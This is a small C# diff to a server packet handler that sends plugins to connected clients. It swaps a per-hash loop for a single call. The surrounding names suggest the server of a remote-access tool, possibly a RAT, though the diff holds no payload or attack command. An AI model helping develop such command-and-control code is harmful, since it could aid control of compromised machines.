@@ -173,10 +173,7 @@ namespace Server.Handle_Packet
                             {
                                 new HandleLogs().Addmsg($"Sending plugins to client {ip} please wait..", Color.Blue);
                                 ThreadPool.QueueUserWorkItem(delegate {
-                                    foreach (string plugin in unpack_msgpack.ForcePathObject("Hashes").AsString.Split(','))
-                                    {
-                                        client.SendPlugin(plugin);
-                                    }
+                                    client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
                                 });
                                 break;
                             }
